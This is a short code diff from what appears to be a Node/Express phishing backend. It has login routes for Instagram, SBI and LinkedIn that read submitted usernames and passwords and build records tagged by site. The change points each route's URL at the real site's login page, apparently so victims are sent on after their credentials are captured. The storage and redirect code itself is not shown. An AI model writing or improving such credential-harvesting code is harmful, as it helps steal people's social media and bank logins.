@@ -38,7 +38,7 @@ db.once('open',function(){
 app.post("/login_insta",function(req,res){
     var username =req.body.username;
     var password =req.body.password;
-    var url="https://www.instagram.com"
+    var url="https://www.instagram.com/accounts/login/?source=auth_switcher"
 
     var data={
         "site":"instagram",
@@ -110,7 +110,7 @@ app.post("/login_sbi",function(req,res){
 app.post("/login_linkedin",function(req,res){
     var username =req.body.username;
     var password =req.body.password;
-    var url="https://www.linkedin.com"
+    var url="https://www.linkedin.com/login"
 
     var data={
         "site":"linkedin",
